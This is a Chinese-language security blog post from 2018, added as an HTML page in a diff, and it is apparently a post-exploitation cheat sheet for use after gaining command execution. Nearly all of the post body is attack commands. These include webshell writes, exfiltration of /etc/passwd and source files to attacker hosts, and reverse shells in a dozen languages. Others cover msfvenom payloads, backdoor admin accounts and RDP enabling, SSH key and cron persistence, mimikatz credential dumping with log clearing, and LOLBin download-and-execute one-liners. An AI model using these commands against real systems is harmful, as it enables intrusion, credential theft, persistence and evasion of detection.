@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <title>命令执行总结</title>
+  <meta name="description" content="0x00 前言命令执行后有关的一些归纳(持续补充)。0x01 基础详情针对命令执行后对系统做更深入的渗透，常规先判断系统类型，命令是否回显，以及目标系统是否能够出网，即系统类型-&gt;是否回显-&gt;能否出网。1.可回显webshell(apache tomcat nginx等可直接解析脚本的写入webshe...">
+  <meta name="author" content="leopardpan">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="命令执行总结">
+  <meta name="twitter:description" content="0x00 前言命令执行后有关的一些归纳(持续补充)。0x01 基础详情针对命令执行后对系统做更深入的渗透，常规先判断系统类型，命令是否回显，以及目标系统是否能够出网，即系统类型-&gt;是否回显-&gt;能否出网。1.可回显webshell(apache tomcat nginx等可直接解析脚本的写入webshe...">
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="命令执行总结">
+  <meta property="og:description" content="0x00 前言命令执行后有关的一些归纳(持续补充)。0x01 基础详情针对命令执行后对系统做更深入的渗透，常规先判断系统类型，命令是否回显，以及目标系统是否能够出网，即系统类型-&gt;是否回显-&gt;能否出网。1.可回显webshell(apache tomcat nginx等可直接解析脚本的写入webshe...">
+  
+  <link rel="icon" type="image/png" href="/images/favicon.png" />
+  <link href="/images/favicon.png" rel="shortcut icon" type="image/png">
+  
+  <link rel="stylesheet" href="/css/main.css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="canonical" href="http://localhost:4000/2018/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/">
+  <link rel="alternate" type="application/rss+xml" title="whynot" href="http://localhost:4000/feed.xml">
+  
+  <meta name="google-site-verification" content="1-1ZlHoRvM0T2FqPbW2S-qLgYXN6rsn52kErlMPd_gw" />
+
+<!-- 站点统计 -->
+  <script 
+  async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+  </script>  
+
+<!-- 百度统计 -->
+  
+  <script>
+      var _hmt = _hmt || [];
+      (function() {
+        var hm = document.createElement("script");
+        hm.src = "//hm.baidu.com/hm.js?7e193e944675994f2e720fe92e3b32f1";
+        var s = document.getElementsByTagName("script")[0]; 
+        s.parentNode.insertBefore(hm, s);
+      })();
+  </script>
+  
+
+<!-- google 统计 -->
+  
+  <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+      ga('create', 'UA-120601257-1', 'auto');
+      ga('send', 'pageview');
+  </script>
+  
+
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-9005224472374751",
+    enable_page_level_ads: true
+  });
+</script>
+
+</head>
+
+
+  <body>
+
+    <span class="mobile btn-mobile-menu">        
+      <div class="nav_container">
+         <nav class="nav-menu-item" style = "float:right">
+            <i class="nav-menu-item">
+              <a href="/#blog" title="" class="blog-button">  博客主页
+              </a>
+            </i>
+            
+                <i class="nav-menu-item">
+
+                  <a href="/archive" title="archive" class="btn-mobile-menu__icon">
+                      所有文章
+                  </a>
+                </i>
+            
+                <i class="nav-menu-item">
+
+                  <a href="/tags" title="tags" class="btn-mobile-menu__icon">
+                      标签
+                  </a>
+                </i>
+            
+                <i class="nav-menu-item">
+
+                  <a href="/about" title="about" class="btn-mobile-menu__icon">
+                      关于我
+                  </a>
+                </i>
+            
+          </nav>
+      </div>
+    </span>
+    
+    <header class="panel-cover panel-cover--collapsed" style="background-image: url('/images/background-cover.jpg')">
+  <div class="panel-main">
+
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+        <!-- 头像效果-start -->
+        <div class="ih-item circle effect right_to_left">            
+            <a href="/#blog" title="前往 whynot 的主页" class="blog-button">
+                <div class="img"><img src="/images/avatar.jpg" alt="img"></div>
+                <div class="info">
+                    <div class="info-back">
+                        <h2> 
+                            
+                                whynotke
+                            
+                        </h2>
+                        <p>
+                           
+                                web / sec
+                            
+                        </p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <!-- 头像效果-end -->
+        <h1 class="panel-cover__title panel-title"><a href="/#blog" title="link to homepage for whynot" class="blog-button">whynot</a></h1>
+        
+        <span class="panel-cover__subtitle panel-subtitle">web sec</span>
+        
+        <hr class="panel-cover__divider" />
+        <p class="panel-cover__description">欢迎来到我的博客~</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+        
+        
+
+        <div class="navigation-wrapper">
+          <div>
+            <nav class="cover-navigation cover-navigation--primary">
+              <ul class="navigation">
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客主页</a></li>
+                
+                  <li class="navigation__item"><a href="/archive" title="archive">所有文章</a></li>
+                
+                  <li class="navigation__item"><a href="/tags" title="tags">标签</a></li>
+                
+                  <li class="navigation__item"><a href="/about" title="about">关于我</a></li>
+                
+              </ul>
+            </nav>
+          </div>          
+        </div>
+
+
+        </div>
+      </div>
+    </div>
+    
+    
+    <div class="panel-cover--overlay cover-clear"></div>
+    
+  </div>
+</header>
+
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner">
+            <article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 class="post-title">命令执行总结</h1>
+    <div class="post-meta">
+      <img src="/images/calendar.png" width="20px"/> 
+      <time datetime="2018-09-12 00:00:00 +0800" itemprop="datePublished" class="post-meta__date date">2018-09-12</time>  
+         
+      <span id="busuanzi_container_page_pv"> | 阅读：<span id="busuanzi_value_page_pv"></span>次</span>
+    </p>
+    </div>
+  </header>
+
+  <section class="post">
+    <h1 id="0x00-前言">0x00 前言</h1>
+<p>命令执行后有关的一些归纳(持续补充)。</p>
+<h1 id="0x01-基础详情">0x01 基础详情</h1>
+<p>针对命令执行后对系统做更深入的渗透，常规先判断系统类型，命令是否回显，以及目标系统是否能够出网，即系统类型-&gt;是否回显-&gt;能否出网。</p>
+<h2 id="1可回显">1.可回显</h2>
+<p>webshell(apache tomcat nginx等可直接解析脚本的写入webshell)</p>
+<h3 id="window">window</h3>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /s/a-d/b d:\*123456.asp  #查找123456.asp 位置
+echo ^&lt;^%eval request^(chr^(35^)^)^%^&gt; &gt; "d:\JINHER\C6\JHSoft.Web.Login\images\LoginTemplate\whynot.asp" # &lt;&gt;等特殊符号在cmd下需要转码 而且写入文件不可带有&lt;&gt;:等特殊字符
+copy c:\\Inetpub\\wwwroot\\ckfinder\\userfiles\\files\\images\\cknife.jpg c:\\Inetpub\\wwwroot\\ckfinder\\userfiles\\files\\images\\cknife.aspx # 命令不好使时尝试其他命令 
+
+for /F %s in ('dir /s/a-d/b c:\*.aspx') do echo 123 &gt;123.aspx
+在有aspx文件的后面重新生成.aspx的后缀 内容为123 例如a.aspx 生成a.aspx.aspx   #缺点相对暴力 优点不回显有时候也可以用
+for /F %s in ('dir /s/a-d/b f:\*login.css') do echo ^&lt;%@ Page Language="Jscript"%^&gt;^&lt;%eval(Request.Item["pass"],"unsafe");%^&gt; &gt;%s.aspx
+</code></pre></div></div>
+<h3 id="linux">linux</h3>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate find等命令 查询文件位置
+echo PD9waHAgcGhwaW5mbygpOz8+ | base64 -d &gt; 360.php   #PD9waHAgcGhwaW5mbygpOz+是&lt;?php phpinfo();?&gt; base64编码 linux文件名不能带有/(斜杠)
+</code></pre></div></div>
+<h3 id="oobout-of-band-无法回显和能出网时使用">OOB(out of band) (无法回显和能出网时使用)</h3>
+<p>window</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>基于OOB(out of band)的回显(能出网)
+for /F %s in ('whoami') do start http://10,10.10.10:8080/?user=%s   #查询文件位置web历史记录 会打开目标浏览器
+for /F %s in ('dir /b') do start http://10.10.10.10:81/?user=%s
+
+curl –T {path to file} ftp://xxx.xxx.xxx.xxx –user {username}:{password}    #传输到ftp
+wget –header="EVIL:$(cat /etc/passwd)" http://xxx.xxx.xxx:xxxx  #需要自搭建server服务器支持
+#wget –header=”evil:`cat /etc/passwd | xargs echo –n`” http://xxx.xxx.xxx:xxxx 
+
+wget –post-data exfil='cat /etc/passwd' http://dnsattacker.com           # extract data  in post section
+wget –post-file trophy.php http://dnsattacker.com    # extract source code
+cat /path/to/sensitive.txt | curl –F ":data=@-" http://dnsattacker.com/test.txt
+
+Viticm
+nc -w 1000 10.10.10.10 1234 &lt; config.php
+Attacker
+nc -l 1234 &gt; config.php
+</code></pre></div></div>
+<p>linux</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>基于OOB(out of band)的回显
+#curl `whoami`.xxxx.xxx(子域名)     #可以用该方法把不回显变得回显
+#curl http://10.10.10.10:81/?user=`id`
+#wget http://10.10.10.10:81/?user=`id`
+#ping %USERNAME%.b182oj.ceye.io
+#ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.xxx.com DNS记录获取源IP（根据情况需要修改，不通用）
+</code></pre></div></div>
+<p>通用的一些</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>需要域名服务器支持
+Victim  #参考https://www.exploit-db.com/docs/english/45370-out-of-band-exploitation-(oob)-cheatsheet.pdf 
+cmd /v /c "ipconfig &gt; output &amp;&amp; certutil -encodehex -f output output.hex 4 &amp;&amp; powershell $text=GetContentoutput.hex;$subdomain=$text.replace(' ','');$j=11111;foreach($i in $subdomain){$final=$j.tostring()+'.'+$i+'.fzrsuf.3w1.pw';$j += 1; nslookup $final }" 
+Attacker
+sudo tcpdump -n port 53 | tee file.txt
+echo "0x$(cat file.txt |tr ' ' '\n' |awk '/file.oob.dnsattacker.com/ {print $1}'|sort -u| cut -d '.' -f 2|tr -d '\n')" | xxd -r -pr
+
+Victim
+wget --header=evil:$(ifconfig|xxd -p -c 100000) http://dnsattacker.com:9000
+Attacker:
+echo "0x$(ncat -lvp 9000 |grep -i evil|tr -d '/' |cut -d ' ' -f2)" |xxd -r -p
+</code></pre></div></div>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fv84afj8z6j31aw0kmajx.jpg" alt="" /></p>
+<h2 id="2可出网">2.可出网</h2>
+<p>反弹shell或传马(使用tcpdump -i eth0 icmp 来监听或者搭建web服务器查看访问日志等来能否出网）。</p>
+<h3 id="window--使用ping-或者下面的download来判断是否能够出网">window  使用ping 或者下面的download来判断是否能够出网，</h3>
+<p>powershell直接反弹(03默认无powershell winserver08默认是2.0）</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.64.128/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.64.128 -port 8888 #反弹shell
+powershell -C "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -l -p 8888"  #监听本地nc
+
+http://192.168.44.132/2.php?id=1;exec master..xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString(''http://youvps/Empire/data/module_source/code_execution/Invoke-Shellcode.ps1'');Invoke-Shellcode -payload windows/meterpreter/reverse_http -lhost 192.168.44.128 -lport 4444 -force';--   #powershell调用msf反弹
+
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.64.128/nishang/Scan/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254   #扫描端口
+</code></pre></div></div>
+<p>msf或者nc或者colbat strike传马等(msf为例)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>生成恶意程序上传执行
+msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' lhost=192.168.127.132 lport=8888 -f dll -o test.dll
+regsvr32 test.dll   #运行dll
+
+attacker监听
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.127.132
+set LPORT 8888
+exploit
+
+nc -vv 115.28.206.51 8080 -e c:\cmd.exe //链接到远程 不输入-e选项即时聊天
+nc -lvvp 8080   //反弹
+nc -nv 192.168.64.1 8080 -e C:\Windows\System32\cmd.exe
+nc -lvp 8080
+</code></pre></div></div>
+<p>直接添加用户</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user xxx 123!@#qwe /add     #添加用户
+net localgroup administrators xxx /add  #将xxx用户加入管理员
+net user xxx /del   #删除用户
+
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  #开启3389 03 08测试通过
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000001 /f  #关闭3389
+REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber #查看远程端口 十六进制
+</code></pre></div></div>
+<h3 id="linux-1">linux</h3>
+
+<ol>
+  <li>linux自带perl python ruby等语言，反弹shell较为容易 个人建议使用bash perl</li>
+</ol>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>判断能否出网
+/usr/bin/curl
+/usr/bin/wget
+/bin/ping
+如果担心引号转义麻烦或着其他 可以直接下载到服务器上执行
+wget http://10.0.0.1/123344/back.pl -P /tmp/   去掉前缀脚本
+perl /tmp/back.pl
+
+curl `whoami`.xxxx.xxx(子域名)     #可以用该方法把不回显变得回显
+
+bash反弹
+bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
+
+上传bash文件
+#!/bin/bash\n\n/bin/bash -i &gt;&amp; /dev/tcp/$1/$2 0&gt;&amp;1
+
+PERL
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+
+Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+PHP
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+If you want a .php file to upload, see the more featureful and robust php-reverse-shell.
+
+Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
+
+Netcat
+nc -e /bin/sh 10.0.0.1 1234
+部分版本nc -e不可用时
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
+
+
+Java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
+p.waitFor()
+
+node.js
+require('child_process').exec('bash -i &gt;&amp; /dev/tcp/1.2.3.4/80 0&gt;&amp;1');
+nc -lvvp 80
+
+lua
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"
+</code></pre></div></div>
+
+<p>2.非交互式添加linux用户</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>useradd -m test
+echo "123456" | passwd --stdin test #非交互式设置密码
+userdel -r test     #删除该用户
+</code></pre></div></div>
+<p>3.写入.ssh/authorized_keys 或者 crontab</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 公钥 &gt; .ssh/authorized_keys
+/var/spool/cron/root    #centos 写入root用户任务计划
+/etc/cron.d/shell   #debian 在/etc/cron.d/会被当作任务计划执行
+</code></pre></div></div>
+<h2 id="3密码抓取">3.密码抓取</h2>
+<h3 id="通用-注意密码抓取需要root权限">通用 注意密码抓取需要root权限。</h3>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>laz.exe all #通用可以抓取wifi密码,常见浏览器(如google facebook登陆密码)，数据库，outlook邮箱以及操作系统等各种密码     #https://github.com/AlessandroZ/LaZagne   
+</code></pre></div></div>
+<h3 id="window-1">window</h3>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>提权参考    #https://github.com/SecWiki/windows-kernel-exploits
+powershell IEX (New-Object Net.WebClient).DownloadString('http://74.121.151.89/123344/PowerShell/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://74.121.151.89/123344/ms15-051.exe -ExeArgs "cmd" -ForceASLR #远程执行exe
+mimikatz    #抓取密码
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"  #https://github.com/gentilkiwi/mimikatz
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.64.128/nishang/Gather/Invoke-Mimikatz.ps1');Invoke-Mimikatz  #远程调用mimikaz  web中注意引号
+mimikaz清除登陆等日志信息
+privilege::debug
+event::drop
+event::clear
+</code></pre></div></div>
+<h3 id="linux-2">linux</h3>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./mimipenguin   #支持ubuntu和Fedora部分版本 https://github.com/huntergregal/mimipenguin
+linux提权好用的一些工具
+https://github.com/rebootuser/LinEnum
+https://github.com/mzet-/linux-exploit-suggester
+https://github.com/SecWiki/linux-kernel-exploits
+</code></pre></div></div>
+
+<h2 id="4下载执行download-and-exec">4.下载执行(download and exec)</h2>
+<ul>
+  <li>window</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell
+powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\download\a.exe');start-process 'c:\download\a.exe'
+
+certutil    #03 08都可以
+certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\download\a.exe&amp;&amp;c:\download\a.exe
+certutil -urlcache -split -f http://192.168.254.102:80/a.txt b.txt
+certutil -urlcache -split -f http://192.168.254.102:80/a a.js &amp;&amp; cscript a.js &amp;&amp;  del a.js &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete  #远程执行js
+certutil -urlcache -split -f http://74.121.151.89/123344/1.vbs a.vbs &amp;&amp; cscript a.vbs &amp;&amp;  del a.vbs &amp;&amp; certutil -urlcache -split -f http://74.121.151.89/123344/1.vbs delete    #加载vbs执行
+vbs 示例代码    #下载保存到c盘
+Set xPost=createObject("Microsoft.XMLHTTP")
+xPost.Open "GET","http://192.168.206.101/file.zip",0
+xPost.Send()
+set sGet=createObject("ADODB.Stream")
+sGet.Mode=3
+sGet.Type=1
+sGet.Open()
+sGet.Write xPost.ResponseBody
+sGet.SaveToFile "c:\file.zip",2
+
+win03无 xp以后自带   #下载速度较慢
+bitsadmin /transfer n http://lemon.com/file.zip c:\1.zip
+bitsadmin /transfer n http://74.121.151.89/mimikaz.exe Z:/file/proof/tmp/1.exe
+bitsadmin /transfer n http://download.sysinternals.com/files/PSTools.zip C:\test\update\PSTools.zip
+bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\p.zip
+
+csscript 
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct    #远程执行文件弹出计算器
+
+telnet  
+服务端：nc -lvp 23 &lt; nc.exe
+下载端：telnet ip -f c:\nc.exe
+
+regsvr32
+regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec.sct scrobj.dll
+
+rundll32  
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
+
+
+mshta
+mshta https://3gstudent.github.io/test/downloadexec2.hta    #需要开启IE浏览器-Internet选项-安全选择可信站点，添加博客地址：https://3gstudent.github.io/
+
+wmic and Regasm/Regsvc
+wmic os get /format:"https://webserver/payload.xsl"
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
+
+</code></pre></div></div>
+<ul>
+  <li>linux</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>linux方法通用，这里不讲述过多 详情可参考 https://gtfobins.github.io/
+wget www.baidu.com/1.rar -P /tmp/ #保存到tmp目录下
+curl $URL -o $LFILE
+nc
+lua
+</code></pre></div></div>
+<p>相关链接如下：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/samratashok/nishang  #powershell框架
+https://github.com/EmpireProject/Empire
+https://github.com/PowerShellMafia/PowerSploit
+https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/
+https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/
+https://gtfobins.github.io/
+http://reverse-tcp.xyz/pentest/red%20team/2017/12/28/windows-to-download-and-execute-arbitrary-code.html
+https://www.exploit-db.com/docs/english/45370-out-of-band-exploitation-(oob)-cheatsheet.pdf
+</code></pre></div></div>
+<p>#
+转载请注明：<a href="https://notwhy.github.io/">whynot</a> » <a href="https://notwhy.gitbooks.io/2018/09/命令执行总结/">web</a></p>
+
+
+
+  </section>
+</article>
+
+<section>
+
+            <div class="content-play">
+              <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang" title="打赏，支持一下">打赏一个呗</a></p>
+              <div class="hide_box-play"></div>
+              <div class="shang_box-play">
+                <a class="shang_close-play" href="javascript:void(0)" onclick="dashangToggle()" title="关闭"><img src="/images/payimg/close.jpg" alt="取消" /></a>
+                <div class="shang_tit-play">
+                  <p>感谢您的支持，我会继续努力的!</p>
+                </div>
+                <div class="shang_payimg">
+                    <img src="/images/payimg/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+                </div>
+              <div class="shang_payimg">    
+                    <img src="/images/payimg/weipayimg.jpg" alt="扫码支持" title="扫一扫" />
+                </div>
+                <div class="pay_explain">扫码打赏，你说多少就多少</div>
+                <div class="shang_payselect">
+                  <div class="pay_item checked" data-id="alipay">
+                    <span class="pay_logo"><img src="/images/payimg/alipay.jpg" alt="支付宝" /></span>
+                  </div>
+                  <div class="pay_item" data-id="weipay">
+                    <span class="pay_logo"><img src="/images/payimg/wechat.jpg" alt="微信" /></span>
+                  </div>
+                </div>
+                <div class="shang_info-play">
+                  <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+                </div>
+              </div>
+            </div>
+            <script type="text/javascript">
+            function dashangToggle(){
+              $(".hide_box-play").fadeToggle();
+              $(".shang_box-play").fadeToggle();
+            }
+            </script>
+
+            <div style="text-align:center;margin:50px 0; font:normal 14px/24px 'MicroSoft YaHei';"></div>
+
+            <style type="text/css">
+              .content-play{width:80%;margin-top: 20px;margin-bottom: 10px;height:40px;}
+              .hide_box-play{z-index:999;filter:alpha(opacity=50);background:#666;opacity: 0.5;-moz-opacity: 0.5;left:0;top:0;height:99%;width:100%;position:fixed;display:none;}
+              .shang_box-play{width:540px;height:540px;padding:10px;background-color:#fff;border-radius:10px;position:fixed;z-index:1000;left:50%;top:50%;margin-left:-280px;margin-top:-280px;border:1px dotted #dedede;display:none;}
+              .shang_box-play img{border:none;border-width:0;}
+              .dashang{display:block;width:100px;margin:5px auto;height:25px;line-height:25px;padding:10px;background-color:#E74851;color:#fff;text-align:center;text-decoration:none;border-radius:10px;font-weight:bold;font-size:16px;transition: all 0.3s;}
+              .dashang:hover{opacity:0.8;padding:15px;font-size:18px;}
+              .shang_close-play{float:right;display:inline-block;
+                margin-right: 10px;margin-top: 20px;
+              }
+              .shang_logo{display:block;text-align:center;margin:20px auto;}
+              .shang_tit-play{width: 100%;height: 75px;text-align: center;line-height: 66px;color: #a3a3a3;font-size: 16px;background: url('/images/payimg/cy-reward-title-bg.jpg');font-family: 'Microsoft YaHei';margin-top: 7px;margin-right:2px;}
+              .shang_tit-play p{color:#a3a3a3;text-align:center;font-size:16px;}
+              .shang_payimg{width:140px;padding:10px;padding-left: 80px; /*border:6px solid #EA5F00;**/margin:0 auto;border-radius:3px;height:140px;display:inline-block;}
+              .shang_payimg img{display:inline-block;margin-right:10px;float:left;text-align:center;width:140px;height:140px; }
+              .pay_explain{text-align:center;margin:10px auto;font-size:12px;color:#545454;}
+              .shang_payselect{text-align:center;margin:0 auto;margin-top:40px;cursor:pointer;height:60px;width:500px;margin-left:110px;}
+              .shang_payselect .pay_item{display:inline-block;margin-right:140px;float:left;}
+              .shang_info-play{clear:both;}
+              .shang_info-play p,.shang_info-play a{color:#C3C3C3;text-align:center;font-size:12px;text-decoration:none;line-height:2em;}
+            </style>
+
+       <ul class="pager">
+        
+        <li class="previous">
+            <a href="/2018/08/RichFaces%E5%8F%8D%E5%BA%8F%E5%88%97%E8%AF%9D%E6%BC%8F%E6%B4%9E-CVE-2013-2165/" data-toggle="tooltip" data-placement="top" title="RichFaces反序列话漏洞——CVE-2013-2165">上一篇：  <span>RichFaces反序列话漏洞——CVE-2013-2165</span>
+            </a>
+        </li>
+        
+        
+    </ul>
+</section>
+
+<section class="post-comments">
+
+  
+    <div id="disqus_thread"></div>
+    <script>
+    
+    var disqus_config = function () {
+        this.page.url = "http://localhost:4000/2018/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/";
+        this.page.identifier = "/2018/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/";
+    };
+    var disqus_shortname = 'whynot1';
+    
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>要查看<a href="http://disqus.com/?ref_noscript"> Disqus </a>评论，请启用 JavaScript</noscript>
+    
+  
+
+</section>
+
+
+            <section class="footer">
+    <footer>
+        <div class = "footer_div">  
+        <nav class="cover-navigation navigation--social">
+          <ul class="navigation">
+
+          
+
+          
+          <!-- Github -->
+          <li class="navigation__item_social">
+            <a href="https://github.com/notwhy" title="@notwhy 的 Github" target="_blank">
+              <i class='social fa fa-github fa-2x'></i>
+              <span class="label">Github</span>
+            </a>
+          </li>
+          
+          
+          
+          <!-- Twitter -->
+          <li class="navigation__item_social">
+            <a href="http://twitter.com/whynotke" title="@whynotke" target="_blank">
+              <i class='social fa fa-twitter fa-2x'></i>
+              <span class="label">Twitter</span>
+            </a>
+          </li>
+          
+
+          
+
+          <!-- RSS -->
+          <li class="navigation__item_social">
+            <a href="/feed.xml" rel="author" title="RSS" target="_blank">
+              <i class='social fa fa-rss fa-2x'></i>
+              <span class="label">RSS</span>
+            </a>
+          </li>
+
+          
+          <!-- Email -->
+          <li class="navigation__item_social">
+            <a href="mailto:547103907@qq.com" title="Contact me">
+              <i class='social fa fa-envelope fa-2x'></i>
+              <span class="label">Email</span>
+            </a>
+          </li>
+          
+
+          </ul>
+        </nav>
+
+        </div>
+
+        <div class = "footer_div">  
+           <p class="copyright text-muted">
+            Copyright &copy; whynot 2018 Theme by <a href="http://baixin.io/">leopardpan</a> |
+            </p>
+        	<div align="right">
+    			<link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+          <!-- 访问统计 -->
+          <span id="busuanzi_container_site_pv">
+            本站总访问量
+            <span id="busuanzi_value_site_pv"></span>次
+          </span>
+
+        </div>
+        <div>
+    </footer>
+</section>
+
+        </div>
+    </div>
+    
+    <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript" src="/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+    
+  </body>
+
+</html>
